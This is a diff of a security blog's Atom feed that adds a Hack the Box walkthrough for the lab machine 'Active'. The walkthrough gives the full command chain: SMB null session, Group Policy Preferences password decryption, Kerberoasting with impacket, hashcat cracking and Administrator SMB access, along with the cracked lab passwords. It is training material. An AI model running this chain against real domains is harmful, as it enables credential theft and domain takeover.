@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
  <title>cyb3rdan.com</title>
- <link href="http://localhost:4000/atom.xml" rel="self"/>
- <link href="http://localhost:4000/"/>
- <updated>2018-11-16T22:06:43+10:30</updated>
- <id>http://localhost:4000</id>
+ <link href="https://cyb3rdan.com/atom.xml" rel="self"/>
+ <link href="https://cyb3rdan.com/"/>
+ <updated>2018-12-14T21:51:40+10:30</updated>
+ <id>https://cyb3rdan.com</id>
  <author>
    <name>Daniel Souter</name>
    <email></email>
@@ -13,13 +13,106 @@
 
  
  <entry>
+   <title>Hack the Box - Active</title>
+   <link href="https://cyb3rdan.com/2018/12/13/Hack-the-Box-Active/"/>
+   <updated>2018-12-13T00:00:00+10:30</updated>
+   <id>https://cyb3rdan.com/2018/12/13/Hack-the-Box-Active</id>
+   <content type="html">&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-badge.jpg&quot; alt=&quot;active-badge&quot; class=&quot;img-responsive&quot; /&gt;
+&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;nmap uncovered what appeared to be a domain controller based upon the open ports&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; initial 10.10.10.100&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-nmap.jpg&quot; alt=&quot;nmap-scan&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;tested and confirmed that SMB null session could be established using:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;smbclient //10.10.10.100/ &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; ACTIVE &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;found what appeared to be GPO preference files with encrypted password in a file groups.xml&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;cpassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;found &lt;a href=&quot;https://github.com/reider-roque/pentest-tools/tree/master/password-cracking/gpprefdecrypt&quot;&gt;https://github.com/reider-roque/pentest-tools/tree/master/password-cracking/gpprefdecrypt&lt;/a&gt;, and used the python script to crack the passowrd. Usage as follows:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;got the password: &lt;strong&gt;GPPstillStandingStrong2k18&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;researched kerberos based upon the username “TGS” and the fact that it is a domain controller.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;found &lt;a href=&quot;https://malicious.link/post/2016/kerberoast-pt2/&quot;&gt;https://malicious.link/post/2016/kerberoast-pt2/&lt;/a&gt; and more specifically the reference to impacket at the bottom of the page&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;cloned impacket from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ran the following command using the above credentials, and got the output below&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./GetUserSPNs.py &lt;span class=&quot;nt&quot;&gt;-request&lt;/span&gt; active.htb/SVC_TGS&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://cyb3rdan.com/assets/images/active/active-impacket.jpg&quot; alt=&quot;active-impacket&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;checked the &lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=example_hashes&quot;&gt;Hashcat example hashes page&lt;/a&gt; for $krb5tgs$23$ format and found that it matches mode 13100&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;added the entire $krb5tgs$23$ string above to a file called active.krb, and used hashcat along with the rockyou.txt wordlist to get the password&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;./hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 13100 active.krb /pentest/wordlists/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;after only a few seconds I had the password: &lt;strong&gt;Ticketmaster1968&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;ran the following command with the new crednetials to connect to the users share&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;smbclient //10.10.10.100/Users &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; ACTIVE &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Ticketmaster1968&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;browsed to Administrator/Desktop and ran the following to get the flag&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;get root.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;to get a shell as Administrator you can simply use the psexec.py impacket script with the same credentials&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
+ 
+ <entry>
    <title>First Post</title>
-   <link href="http://localhost:4000/2018/11/16/First-Post/"/>
+   <link href="https://cyb3rdan.com/2018/11/16/First-Post/"/>
    <updated>2018-11-16T00:00:00+10:30</updated>
-   <id>http://localhost:4000/2018/11/16/First-Post</id>
+   <id>https://cyb3rdan.com/2018/11/16/First-Post</id>
    <content type="html">&lt;p&gt;Creating a blog is something I’ve been wanting to do for a while now, but there have been so many more important things going on in my life that meant I just never got around to it.&lt;/p&gt;
 
 &lt;p&gt;In terms of content, I have been focusing quite a lot on &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt; lately, and I will likely start with some walkthroughs once I get around to making my notes more complete.&lt;/p&gt;
+
+&lt;!--more--&gt;
 
 &lt;p&gt;Other than walkthroughs, I will be starting my &lt;a href=&quot;https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&quot;&gt;OSCP&lt;/a&gt; journey soon, and am planning to add my thoughts to the many others who have been through the same process before me. The hope is that if I can write about certain tools and processes that it will only increase my chances of passing on my first attempt.&lt;/p&gt;
 
